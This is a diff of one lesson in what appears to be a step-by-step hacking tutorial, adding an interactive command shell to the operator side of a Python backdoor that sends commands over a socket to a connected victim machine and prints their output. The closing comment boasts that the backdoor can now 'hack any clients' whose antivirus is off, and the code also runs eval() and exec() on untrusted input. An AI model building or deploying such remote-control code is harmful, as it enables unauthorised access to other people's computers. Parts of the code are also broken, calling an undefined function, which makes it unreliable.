@@ -1,9 +1,12 @@
-# Day 8 - The Json Module
-# 1     Json stands for Javascript Object Notation. Json uses a data map structure and usess very less data unlike XML. ie. {'a':[{'x':1},{'y':2}]} 
-#       Basically, Like what we did in with message_send and message_recv, we are importing the json module for the complicated results. 
+# Day 9 - Creating the Shell
+# 1     Before we proceed to make the shell, let's think what are the commands that we needed for our goal.
+#       the common one's are 'cd' for changing directory and 'ls' for listing all the items in current directory.
+#       Additionally, we are going to create 'clear' and 'quit'
       
 import socket
-import json # 2
+import json
+import subprocess # 2
+import os # 2
 
 def ip_address():
     global server_ip
@@ -20,17 +23,17 @@ server_port = 5555
 
 #########################
 
-def json_send(data): # 3
-    jsondata = json.dumps(data) # 4
-    client.send(jsondata.encode()) # 5
+def json_send(data):
+    jsondata = json.dumps(data)
+    client.send(jsondata.encode())
 
-def json_recv(size=1024): # 6
-    data = '' # 7
+def json_recv(size=1024):
+    data = ''
     while True:
-        try: # 8
+        try:
             data += client.recv(size).decode().rstrip()
             return json.loads(data)
-        except ValueError: # 9
+        except ValueError:
             continue
 
 
@@ -61,8 +64,28 @@ def message_recv(size=8):
     if no_str == 'T':
         body = eval(body)
     return body
+    
 
-def connection(): # 10
+def shell(): # 4
+    while True: # 5
+        command = input('Command Here: ') # 6
+        json_send(command) # 7
+        if command == 'cd':
+            pass
+        elif command == 'ls':
+            pass
+        elif command == 'clear':
+            pass
+        elif command == 'quit':
+            break # 8
+        else: # 14
+            result = reliable_recv() # 15
+            print(result)   
+
+
+
+
+def connection():
     global server,client,ip
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((server_ip,server_port))
@@ -72,32 +95,28 @@ def connection(): # 10
     exec(Path('client.py').read_text())
     #####   DELETABLE   #####
     client, ip = server.accept()
+    shell() # 3
 
 connection()
 
-# testing
 
 
 #########################
 
-# 2     importing json module that comes with the standard modules of python3
-# 3     Unlike what we have did previously on message_send/recv, this is straight forward, we are not sending a header to the receiver.
-# 4     dumps converts python objects into a json string
-# 5     sending it to the receiver.
-# 6     this time, the default is 1024. because...
-# 7     we are making a chunk. it is a container that holds the message that we are receiving.
-# 8     we are going in an infinite loop again and try if we are still receiving a data from the sender.
-#       If we received, we will be going to encode it and strip the white space from the right to avoid unnecessary white spaces.
-#       and then, we are appending the chunk to the (data = ''). and return the the entire chunk by loading the dump (json.load())
-# 9     If it returns a ValueError while we are still receiving a data, continue the iteration. (kinda tricking the machine in a different way)
-# 10    Renamed to "connection" also in the client.py
+# 2     before we start, we are going to add 2 new modules for this lecture. The os and subprocess module.
+# 3     calling the shell function inside the connection()
+# 4     new fucntion
+# 5     imagine how the terminal works, or even the command prompt in windows.. whenever you typed a commmand, there will be another available input for your next command.
+#       that's why we are making the shell always 'True'
+# 6     I assume that you already know these next codes.
+# 7     we are going to send the 
+# 8     if the input is quit. we have to stop the code immediately.
+# 14    we are adding one more recurse. Like what we did in the client.py, if nothing is selected from ['cd', 'ls',' 'clear', 'quit'], 
+#       then it means that, we have wrote a command for the command prompt in the backdoor and we are expecting to get a output.
+# 15    we are going to assign it to 'result'
+# 16    and we are going to print it.
 
-# Q     What is this json tool for?
-#       - We need this tool for larger outputs.
-#       If we need that for larger output, Why not we increase the byte size of the message_recv/message_send function and use it?
-#       - This can be useful for complicated output. Also in a .json files.
-#       How can we test this json tool?
-#       - We are going to make a new function on the next-next tutorial.
+#       now we have managed to create the backdoor. we can now hack any clients with a low security protection. (turned off windows defender)
 
 #########################
 
